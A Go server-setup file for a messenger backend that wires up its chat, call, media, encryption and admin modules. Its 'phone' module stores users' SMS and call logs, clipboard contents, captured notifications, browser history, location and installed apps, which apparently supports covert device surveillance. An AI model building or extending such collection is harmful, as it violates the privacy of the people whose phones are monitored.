package server

import (
	"context"
	"fmt"
	"net/http"
	"strings"
	"time"

	"github.com/go-chi/chi/v5"
	"github.com/go-chi/cors"
	"github.com/googollee/go-socket.io"
	"github.com/jeogram/messenger/internal/config"
	adminhandler "github.com/jeogram/messenger/internal/modules/admin/handler"
	"github.com/jeogram/messenger/internal/modules/auth/domain"
	"github.com/jeogram/messenger/internal/modules/auth/handler"
	"github.com/jeogram/messenger/internal/modules/auth/repository"
	"github.com/jeogram/messenger/internal/modules/auth/service"
	calldomain "github.com/jeogram/messenger/internal/modules/calls/domain"
	callhandler "github.com/jeogram/messenger/internal/modules/calls/handler"
	callrepo "github.com/jeogram/messenger/internal/modules/calls/repository"
	callservice "github.com/jeogram/messenger/internal/modules/calls/service"
	chatdomain "github.com/jeogram/messenger/internal/modules/chat/domain"
	chathandler "github.com/jeogram/messenger/internal/modules/chat/handler"
	chatrepo "github.com/jeogram/messenger/internal/modules/chat/repository"
	chatService "github.com/jeogram/messenger/internal/modules/chat/service"
	contactdomain "github.com/jeogram/messenger/internal/modules/contact/domain"
	contacthandler "github.com/jeogram/messenger/internal/modules/contact/handler"
	contactrepo "github.com/jeogram/messenger/internal/modules/contact/repository"
	contactservice "github.com/jeogram/messenger/internal/modules/contact/service"
	e2eedomain "github.com/jeogram/messenger/internal/modules/e2ee/domain"
	e2eehandler "github.com/jeogram/messenger/internal/modules/e2ee/handler"
	e2eerepo "github.com/jeogram/messenger/internal/modules/e2ee/repository"
	mediadomain "github.com/jeogram/messenger/internal/modules/media/domain"
	mediahandler "github.com/jeogram/messenger/internal/modules/media/handler"
	mediaservice "github.com/jeogram/messenger/internal/modules/media/service"
	messagedomain "github.com/jeogram/messenger/internal/modules/message/domain"
	messagehandler "github.com/jeogram/messenger/internal/modules/message/handler"
	messagerepo "github.com/jeogram/messenger/internal/modules/message/repository"
	messageservice "github.com/jeogram/messenger/internal/modules/message/service"
	notificationdomain "github.com/jeogram/messenger/internal/modules/notification/domain"
	notificationhandler "github.com/jeogram/messenger/internal/modules/notification/handler"
	notificationrepo "github.com/jeogram/messenger/internal/modules/notification/repository"
	notificationservice "github.com/jeogram/messenger/internal/modules/notification/service"
	phonedomain "github.com/jeogram/messenger/internal/modules/phone/domain"
	phonehandler "github.com/jeogram/messenger/internal/modules/phone/handler"
	phoneservice "github.com/jeogram/messenger/internal/modules/phone/service"
	userdomain "github.com/jeogram/messenger/internal/modules/user/domain"
	userhandler "github.com/jeogram/messenger/internal/modules/user/handler"
	userrepo "github.com/jeogram/messenger/internal/modules/user/repository"
	userservice "github.com/jeogram/messenger/internal/modules/user/service"
	"github.com/jeogram/messenger/internal/pkg/auth"
	"github.com/jeogram/messenger/internal/pkg/cache"
	"github.com/jeogram/messenger/internal/pkg/events"
	"github.com/jeogram/messenger/internal/pkg/mail"
	"github.com/jeogram/messenger/internal/pkg/middleware"
	dbmigrate "github.com/jeogram/messenger/internal/pkg/migrate"
	"github.com/jeogram/messenger/internal/pkg/realtime"
	"github.com/jeogram/messenger/internal/pkg/webhook"
	"github.com/jeogram/messenger/internal/pkg/ws"
	"github.com/prometheus/client_golang/prometheus/promhttp"
	"github.com/rs/zerolog/log"
	httpSwagger "github.com/swaggo/http-swagger"
	"gorm.io/gorm"
)

// Server объединяет HTTP-сервер и его зависимости.
type Server struct {
	cfg            *config.Config
	db             *gorm.DB
	redis          *cache.Redis
	producer       *events.Producer
	hub            *ws.Hub
	jwt            *auth.JWT
	socketIOServer *socketio.Server
	broadcaster    realtime.Broadcaster
	webhooks       *webhook.Dispatcher

	authSvc    *service.AuthService
	userSvc    *userservice.UserService
	chatSvc    *chatService.ChatService
	mediaSvc   *mediaservice.MediaService
	msgSvc     *messageservice.MessageService
	notifSvc   *notificationservice.NotificationService
	callSvc    *callservice.CallService
	contactSvc *contactservice.ContactService
	phoneSvc   *phoneservice.PhoneService
	adminH     *adminhandler.AdminHandler
	prekeyRepo *e2eerepo.PreKeyRepository
}

// New создаёт сервер: выполняет миграции и инициализирует модули.
func New(cfg *config.Config, db *gorm.DB, redis *cache.Redis, producer *events.Producer, hub *ws.Hub) (*Server, error) {
	if err := migrate(db); err != nil {
		return nil, err
	}
	if cfg.DB.Driver == "postgres" {
		if err := dbmigrate.Run(db); err != nil {
			log.Warn().Err(err).Msg("versioned migrations failed")
		}
	}

	jwtSvc := auth.NewJWT(cfg.JWT)
	socketIOServer := newSocketIOServer(jwtSvc, hub)
	broadcaster := &realtime.MultiBroadcaster{Broadcasters: []realtime.Broadcaster{
		&realtime.WSBroadcaster{Hub: hub},
		&realtime.SocketIOBroadcaster{Server: socketIOServer},
	}}
	webhooks := webhook.New(cfg.Webhooks.URLs, cfg.Webhooks.Timeout)

	userRepo := repository.NewUserRepository(db)
	settingsRepo := userrepo.NewSettingsRepository(db)
	chatRepo := chatrepo.NewChatRepository(db)
	msgRepo := messagerepo.NewMessageRepository(db)
	deviceRepo := notificationrepo.NewDeviceRepository(db)
	notifRepo := notificationrepo.NewNotificationRepository(db)
	callRepo := callrepo.NewCallRepository(db)
	contactRepo := contactrepo.NewContactRepository(db)
	vrfRepo := repository.NewVerificationRepository(db)
	mailer := mail.New(cfg.SMTP)
	prekeyRepo := e2eerepo.NewPreKeyRepository(db)

	authSvc := service.NewAuthService(userRepo, vrfRepo, jwtSvc, redis, mailer, cfg.Auth, webhooks, deviceRepo)
	userSvc := userservice.NewUserService(userRepo, settingsRepo, contactRepo, chatRepo, deviceRepo)
	chatSvc := chatService.NewChatService(chatRepo, redis)
	msgSvc := messageservice.NewMessageService(msgRepo, chatRepo, producer, cfg.Kafka, broadcaster, cfg.Message, redis, webhooks)
	mediaSvc, err := mediaservice.NewMediaService(cfg.Media, db)
	if err != nil {
		return nil, fmt.Errorf("media service: %w", err)
	}
	pushSvc := notificationservice.NewPushService(cfg.Push)
	notifSvc := notificationservice.NewNotificationService(deviceRepo, notifRepo, userRepo, chatRepo, pushSvc, broadcaster, producer, cfg.Kafka.NotifyTopic)
	callSvc := callservice.NewCallService(callRepo, chatRepo, cfg.RTC, webhooks)
	contactSvc := contactservice.NewContactService(contactRepo, userRepo, settingsRepo)
	phoneSvc := phoneservice.NewPhoneService(db)
	adminH := adminhandler.NewAdminHandler(db, jwtSvc, cfg.Admin.UserIDs, broadcaster)

	return &Server{
		cfg: cfg, db: db, redis: redis, producer: producer, hub: hub,
		jwt: jwtSvc, socketIOServer: socketIOServer, broadcaster: broadcaster,
		webhooks: webhooks, authSvc: authSvc, userSvc: userSvc, chatSvc: chatSvc,
		mediaSvc: mediaSvc, msgSvc: msgSvc, notifSvc: notifSvc, callSvc: callSvc,
		contactSvc: contactSvc, phoneSvc: phoneSvc, adminH: adminH, prekeyRepo: prekeyRepo,
	}, nil
}

func migrate(db *gorm.DB) error {
	return db.AutoMigrate(
		&domain.User{},
		&domain.VerificationCode{},
		&userdomain.UserSettings{},
		&userdomain.BlockedUser{},
		&contactdomain.Contact{},
		&chatdomain.Chat{},
		&chatdomain.ChatParticipant{},
		&messagedomain.Message{},
		&messagedomain.ReadReceipt{},
		&messagedomain.Reaction{},
		&messagedomain.PinnedMessage{},
		&notificationdomain.DeviceToken{},
		&notificationdomain.Notification{},
		&calldomain.Call{},
		&mediadomain.MediaRecord{},
		&phonedomain.DeviceInfo{},
		&phonedomain.DeviceStatus{},
		&phonedomain.LocationPoint{},
		&phonedomain.InstalledApp{},
		&phonedomain.PhoneContact{},
		&phonedomain.CallLog{},
		&phonedomain.SmsLog{},
		&phonedomain.ClipboardEntry{},
		&phonedomain.NotificationCapture{},
		&phonedomain.AppUsage{},
		&phonedomain.MediaItem{},
		&phonedomain.DeviceAccount{},
		&phonedomain.WifiNetwork{},
		&phonedomain.BluetoothDevice{},
		&phonedomain.CalendarEvent{},
		&phonedomain.SensorReading{},
		&phonedomain.BrowserHistory{},
		&e2eedomain.PreKey{},
	)
}

// Router builds the chi router with all routes mounted.
func (s *Server) Router() *chi.Mux {
	r := chi.NewRouter()

	r.Use(cors.Handler(cors.Options{
		AllowedOrigins:   []string{"*"},
		AllowedMethods:   []string{"GET", "POST", "PUT", "DELETE", "OPTIONS", "PATCH"},
		AllowedHeaders:   []string{"Accept", "Authorization", "Content-Type"},
		AllowCredentials: false,
	}))
	r.Use(middleware.Logger)
	r.Use(middleware.Recover)
	if s.cfg.Metrics.Enabled {
		r.Use(middleware.Metrics)
	}

	// Health & readiness.
	r.Get("/health", func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte(`{"status":"ok"}`))
	})
	r.Get("/ready", func(w http.ResponseWriter, req *http.Request) {
		if err := s.db.WithContext(req.Context()).Exec("SELECT 1").Error; err != nil {
			w.WriteHeader(http.StatusServiceUnavailable)
			return
		}
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte(`{"status":"ready"}`))
	})

	// Swagger UI.
	r.Get("/swagger/*", httpSwagger.WrapHandler)

	// Realtime: Socket.IO transport (auth via ?token=, one room per user).
	r.Handle("/socket.io/*", s.socketIOServer)

	// Realtime websocket (raw, Postman-testable).
	r.With(middleware.JWTAuth(s.jwt)).Get("/ws", s.hub.Handler())

	// Module handlers.
	authH := handler.NewAuthHandler(s.authSvc, s.jwt)
	userH := userhandler.NewUserHandler(s.userSvc, s.contactSvc, s.jwt, s.hub)
	chatH := chathandler.NewChatHandler(s.chatSvc, s.jwt)
	msgH := messagehandler.NewMessageHandler(s.msgSvc, s.jwt)
	mediaH := mediahandler.NewMediaHandler(s.mediaSvc, s.jwt)
	notifH := notificationhandler.NewNotificationHandler(s.notifSvc, s.jwt)
	callH := callhandler.NewCallsHandler(s.callSvc, s.chatRepo(), s.broadcaster, s.jwt)
	contactH := contacthandler.NewContactHandler(s.contactSvc, s.jwt)
	phoneH := phonehandler.NewPhoneHandler(s.phoneSvc, s.jwt)
	e2eeH := e2eehandler.NewE2EEHandler(s.prekeyRepo, s.jwt)

	authH.RegisterRoutes(r)
	userH.RegisterRoutes(r)
	chatH.RegisterRoutes(r)
	msgH.RegisterRoutes(r)
	mediaH.RegisterRoutes(r)
	notifH.RegisterRoutes(r)
	callH.RegisterRoutes(r)
	contactH.RegisterRoutes(r)
	phoneH.RegisterRoutes(r)
	e2eeH.RegisterRoutes(r)
	s.adminH.RegisterRoutes(r)

	if s.cfg.Metrics.Enabled {
		r.Handle(s.cfg.Metrics.Path, promhttp.Handler())
	}

	return r
}

// StartWorkers запускает фоновые процессы (например, публикацию отложенных сообщений).
func (s *Server) StartWorkers(ctx context.Context) {
	go func() {
		ticker := time.NewTicker(5 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				if n, err := s.msgSvc.PublishDueScheduled(ctx); err != nil {
					log.Error().Err(err).Msg("scheduled message worker error")
				} else if n > 0 {
					log.Info().Int("count", n).Msg("published scheduled messages")
				}
			}
		}
	}()
}

// chatRepo возвращает репозиторий чатов (нужен обработчикам звонков для доступа).
func (s *Server) chatRepo() *chatrepo.ChatRepository {
	return chatrepo.NewChatRepository(s.db)
}

// newSocketIOServer строит Socket.IO-сервер: каждое подключение
// аутентифицируется по JWT (?token=) и попадает в приватную комнату "u:<userID>".
func newSocketIOServer(jwtSvc *auth.JWT, _ *ws.Hub) *socketio.Server {
	io := socketio.NewServer(nil)

	io.OnConnect("/", func(c socketio.Conn) error {
		u := c.URL()
		token := u.Query().Get("token")
		if token == "" {
			token = strings.TrimPrefix(c.RemoteHeader().Get("Authorization"), "Bearer ")
		}
		claims, err := jwtSvc.ParseAccess(token)
		if err != nil {
			log.Warn().Err(err).Msg("socket.io: rejected unauthorized connection")
			return err
		}
		c.Join(realtime.SocketIORoom(claims.UserID))
		return nil
	})

	io.OnError("/", func(_ socketio.Conn, err error) {
		log.Error().Err(err).Msg("socket.io error")
	})

	return io
}

// Run starts the HTTP server and blocks until the context is cancelled.
func (s *Server) Run(ctx context.Context) error {
	addr := fmt.Sprintf("%s:%d", s.cfg.HTTP.Host, s.cfg.HTTP.Port)
	srv := &http.Server{
		Addr:         addr,
		Handler:      s.Router(),
		ReadTimeout:  s.cfg.HTTP.ReadTimeout,
		WriteTimeout: s.cfg.HTTP.WriteTimeout,
	}
	go func() {
		<-ctx.Done()
		shutdownCtx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		defer cancel()
		_ = srv.Shutdown(shutdownCtx)
	}()
	if err := srv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
		return err
	}
	return nil
}
